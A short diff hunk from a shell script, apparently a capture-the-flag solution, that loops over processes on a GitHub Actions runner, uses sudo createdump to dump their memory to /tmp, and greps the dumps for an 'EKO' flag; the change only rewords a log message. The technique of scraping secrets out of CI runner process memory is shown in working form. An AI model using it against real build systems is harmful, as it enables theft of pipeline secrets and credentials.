@@ -18,7 +18,7 @@ do
     echo $(sudo /home/runner/runners/2.284.0/bin/createdump -n $pid) >> /tmp/file.txt;
     echo "[-] Checking output file... [file /tmp/coredump.$pid]" >> /tmp/file.txt;
     file /tmp/coredump.$pid >> /tmp/file.txt;
-    echo "[!] Searching EKO flag in the output file... [strings /tmp/coredump.$pid | grep EKO]" >> /tmp/file.txt;
+    echo "[!] Searching flag in the output file... [strings /tmp/coredump.$pid | grep EKO]" >> /tmp/file.txt;
     strings /tmp/coredump.$pid | grep EKO >> /tmp/file.txt;
     rm /tmp/coredump.$pid;
 done
